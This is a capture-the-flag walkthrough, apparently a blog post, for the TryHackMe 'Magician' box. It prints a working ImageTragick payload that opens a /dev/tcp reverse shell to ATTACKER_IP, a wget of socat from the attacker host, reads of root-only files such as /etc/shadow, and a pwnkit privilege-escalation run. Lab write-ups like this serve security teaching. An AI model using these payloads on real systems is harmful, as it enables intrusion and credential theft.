# Introduction
This is an easy challenge box on
[TryHackMe](https://tryhackme.com/r/room/magician){:target="_blank"}{:rel="noopener noreferrer"}
. Takes about 7 minutes to boot up

> This is what a hint will look like

# Enumeration
## Hosts
There's a note by the author that we need to add the 
following to our `/etc/hosts` file

`VICTIM_IP magician`

## Ports
Let's start with a scan to see open ports and services
{% highlight bash %}
rustscan -a VICTIM_IP -- -A -os scan -sC
{% endhighlight %}

![scan1](/images/magician/magician-scan1.png)

![scan2](/images/magician/magician-scan2.png)

We have three ports to take note of
- 21: FTP
- 8080: HTTP
- 8081: HTTP

## File Upload Service
Let's upload a test file and see what we can find

![test-upload](/images/magician/magician-test-upload.png)

Seems like converted files are sent to the `/files` 
directory on port 8080, the other open web port

![file-dir](/images/magician/magician-8080-files.png)

Unfortunately we can't view the uploaded file.
Clicking the link download the file so we need to find
another avenue

## FTP
> Do you need credentials to access ftp?
> The box isn't hanging, just be patient

Let's try to login to ftp with 
`anonymous:anonymous` credentials

{% highlight bash %}
ftp VICTIM_IP 21
{% endhighlight %}

![ftp](/images/magician/magician-ftp-hint.png)

We're given a hint to check out 
[ImageTragick](https://imagetragick.com/){:target="_blank"}{:rel="noopener noreferrer"}
. Older versions of ImageMagick, an image processing 
library, are vulnerable to RCE! Let's take advantage 
of this to get a shell

# Initial Foothold
> Inspect public payloads to get the proper format

## Exploit Crafting
For reference, I used 
[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20ImageMagick){:target="_blank"}{:rel="noopener noreferrer"}
and modified the ImageMagick exploit

Write the following into a file named `revshell.png` replacing
`ATTACKER_IP` with your ip

{% highlight bash %}
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; /bin/bash <&196 >&196 2>&196")'
pop graphic-context
{% endhighlight %}

## Magician Shell
Set a listener on your machine to catch the reverse shell

{% highlight bash %}
nc -lvnp 4444
{% endhighlight %}

Now we upload `revshell.png` and wait

![revshell](/images/magician/magician-revshell.png)

We're in!!! Since `python` is available we can stabilize
and improve the reverse shell

{% highlight bash %}
python -c 'import pty; pty.spawn("/bin/bash")'
# hit ctrl+z to background the process
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=screen
{% endhighlight %}

Now we have colored output, tab completion, and can clear
the screen

![improved-shell](/images/magician/magician-upgraded-shell.png)

Let's investigate the home directory and see what
we can find

![listen-hint](/images/magician/magician-listen-hint.png)

> What local ports are listening?

We can list listening ports with

{% highlight bash %}
ss -tunlp
{% endhighlight %}

![listen-cmd](/images/magician/magician-listening-ports.png)

## linpeas
While this isn't necessary, running a privilege escalation
script can reveal interesting information

![linpeas-ports](/images/magician/magician-linpeas-ports.png)

> Which port wasn't seen in our initial scan?

![linpeas-6666](/images/magician/magician-linpeas-6666.png)

This tells us which port is open, as well as what's running 
on this port. 
[Gunicorn](https://gunicorn.org/){:target="_blank"}{:rel="noopener noreferrer"}
is an http server for Unix. We can confirm an http server 
is working by sending a request

{% highlight bash %}
curl localhost:6666
{% endhighlight %}

![curl-6666](/images/magician/magician-curl-6666.png)

# root.txt
> How can we access internal ports from outside 
> the internal network?
If we forward this port we can access this service in  our 
browser. To achieve this we'll be using a
[socat static binary](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64){:target="_blank"}{:rel="noopener noreferrer"}

{% highlight bash %}
# host, in directory with socat binary
python3 -m http.server 80

# victim
wget http://ATTACKER_IP/socat
chmod +x socat
./socat TCP-LISTEN:9999,fork TCP:127.0.0.1:6666
{% endhighlight %}

Now we can access the internal webserver by accessing

`http://magician:9999`

![port-forward-home](/images/magician/magician-port-forward-page.png)

It's asking us to input a file name. We know from linpeas 
that this process is running as root so let's try a file 
only root has access to. I'm going to use `/etc/sudoers` but 
you could also use `/etc/shadow` or `/root/root.txt`

![sudoers-bin](/images/magician/magician-sudoers-binary.png)

![sudoers-hex](/images/magician/magician-sudoers-hex.png)

![sudoers-b64](/images/magician/magician-sudoers-b64.png)

![sudoers-rot13](/images/magician/magician-sudoers-rot13.png)

The file we want to read will be given to us, but it will 
be in one of four formats: 
- binary 
- hex
- base64
- rot13

Thankfully these are all easy enough to decode with 
[cyberchef](https://cyberchef.org/){:target="_blank"}{:rel="noopener noreferrer"},
so now we're able to read `root.txt`!

# Alternative root.txt
> What does the source returned by port 6666 do?

If you don't want to port forward and can understand HTML and JS, 
you could always do things locally! By reading the source 
returned from `curl`, we see it's sending a post request with the 
variable `filename`. Let's emulate this with `curl`

{% highlight bash %}
curl localhost:6666 -d "filename=/etc/sudoers"
{% endhighlight %}

![curl-binary](/images/magician/magician-curl-binary.png)

We get the same thing!

# Root Shell
While this isn't the intended route, this box is still 
vulnerable to 
[pwnkit](https://github.com/joeammond/CVE-2021-4034){:target="_blank"}{:rel="noopener noreferrer"}
which is a local privilege escalation exploit. If you want to 
explore the box further upload the python script and run it

{% highlight bash %}
python3 CVE-2021-4034.py
# source for randomly encoding a file
cat /root/flask/magiccat.py
{% endhighlight %}

![magiccat](/images/magician/magician-root-magiccat.png)

# Recap
A web services converts user uploaded png files to jpg. 
An ftp hint directs the user to exploiting ImageMagick 
with [ImageTragick](https://imagetragick.com/){:target="_blank"}{:rel="noopener noreferrer"}.
Using [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20ImageMagick){:target="_blank"}{:rel="noopener noreferrer"}
as a template,
a reverse shell payload can be crafted. Another hint points 
towards investigating listening ports. Using curl or port 
forwarding we have access to a privileged file read.
